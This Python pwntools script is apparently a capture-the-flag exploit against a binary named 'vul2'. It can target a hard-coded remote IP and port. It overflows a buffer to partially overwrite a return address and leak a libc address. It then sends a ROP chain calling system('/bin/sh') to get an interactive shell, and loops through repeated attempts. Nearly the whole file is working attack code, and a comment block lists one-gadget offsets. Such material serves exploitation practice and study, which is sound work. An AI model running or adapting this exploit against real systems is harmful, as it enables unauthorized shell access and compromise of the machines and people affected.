from threading import TIMEOUT_MAX
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vul2"
elf = ELF(vuln_path)
libc = elf.libc



def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def getio():
    io = process([vuln_path]) if not f_remote else remote("1.95.8.146", 9999)
    return io

def pwn(io):
    io.sendlineafter("> ", b"1")
    payload = b"A" * 0x103
    payload += p8(0x17)
    payload += p16(0xe91A)
    io.sendlineafter("You grip your sword and shout:", payload)
    
    io.recvuntil("Unlocked: Dumb Luck\n", drop=True)
    
    data = io.recvuntil("[Attack]:", timeout=1)
    if len(data) < 5:
        return

    data = io.recvline()
    libc.address = int(data) - 0x204643
    log.success("lic.address: -----> " + hex(libc.address))
    # one = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
    # one = libc.address + one[3]

    system_addr = libc.symbols.get("system")
    binsh_addr = next(libc.search("/bin/sh"))
    pop_rdi = 0x000000000010f75b
    ret = 0x000000000002882f

    io.sendlineafter("> ", b"1")
    ddebug("breakrva 0x1816\n continue")
    payload = b"A" * 0x103
    payload += p8(0x17)
    payload += p64(ret+libc.address)
    payload += p64(pop_rdi+libc.address) + p64(binsh_addr)
    payload += p64(system_addr)
    io.sendlineafter("You grip your sword and shout:", payload)


    io.interactive()

"""
0x000000000002882f : ret
0x000000000010f75b : pop rdi ; ret
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0xef4ce execve("/bin/sh", rbp-0x50, r12)
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])

"""
for i in range(10):
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        pass
    finally:
        if io:
            io.close()



